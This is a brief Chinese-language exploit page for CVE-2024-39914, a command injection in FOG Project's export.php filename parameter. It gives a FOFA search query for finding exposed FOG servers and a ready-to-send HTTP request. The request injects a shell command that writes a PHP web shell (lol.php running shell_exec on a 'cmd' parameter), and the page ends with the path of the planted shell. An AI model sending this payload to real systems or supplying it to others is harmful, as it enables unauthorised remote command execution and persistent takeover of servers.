# fogproject系统接口export.php存在远程命令执行漏洞(CVE-2024-39914)

FOG是一款克隆/成像/救援套件/库存管理系统。在版本低于1.5.10.34的情况下，FOG中的packages/web/lib/fog/reportmaker.class.php文件受到命令注入漏洞的影响，该漏洞存在于/fog/management/export.php的文件名参数中。此漏洞已在版本1.5.10.34中得到修复。

## fofa

```yaml
body="FOG Project"
```

## poc

```yaml
POST /fog/management/export.php?filename=$(echo+'<?php+echo+shell_exec($_GET['"'cmd'"']);+?>'+>+lol.php)&type=pdf HTTP/1.1  
Host: 192.168.15.5 
Content-Length: 21  
User-Agent: ToxicPotato  
Content-Type: application/x-www-form-urlencoded; charset=UTF-8  
  
fogguiuser=fog&nojson=2
```

![victory](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407191238873.png)

文件路径：`/fog/management/lol.php`